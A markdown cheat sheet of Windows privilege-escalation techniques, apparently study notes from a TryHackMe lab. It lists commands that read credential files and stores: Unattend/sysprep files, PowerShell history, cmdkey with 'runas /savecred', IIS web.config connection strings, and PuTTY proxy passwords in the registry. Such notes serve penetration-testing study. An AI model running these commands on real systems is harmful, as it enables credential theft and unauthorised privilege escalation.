# Windows Privilege Escalation

* [Unattended Windows Installations](#unattended-windowsinstallations)
* [Powershell History](#powershell-history)
* [Saved Windows Credentials](#saved-windows-credentials)
* [Internet Information Services Configuration](#internet-information-services-configuration)
* [Retrieve Credentials from Software: PuTTY](#retrieve-credentials-from-software:-putty)

*********************************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
*********************************************************************************

## Unattended Windows Installations

Check these locations for credentials:

* C:\Unattend.xml
* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Unattend\Unattend.xml
* C:\Windows\system32\sysprep.inf
* C:\Windows\system32\sysprep\sysprep.xml

********************************************

## Powershell History
From Command Prompt:
```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
From PowerShell:
```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

********************************************

## Saved Windows Credentials

List saved credentials:
```
cmdkey /list
```
While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option:
```
runas /savecred /user:admin cmd.exe
```

********************************************

## Internet Information Services Configuration
* (ISS)

Can find "web.config" in one of the following locations:
```
C:\inetpub\wwwroot\web.config
```
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```
Quick way to find database connection strings on the file:
```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

********************************************

## Retrieve Credentials from Software: PuTTY

Search under the following registry key for ProxyPassword:
```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

### Reference:
* https://tryhackme.com/room/windowsprivesc20
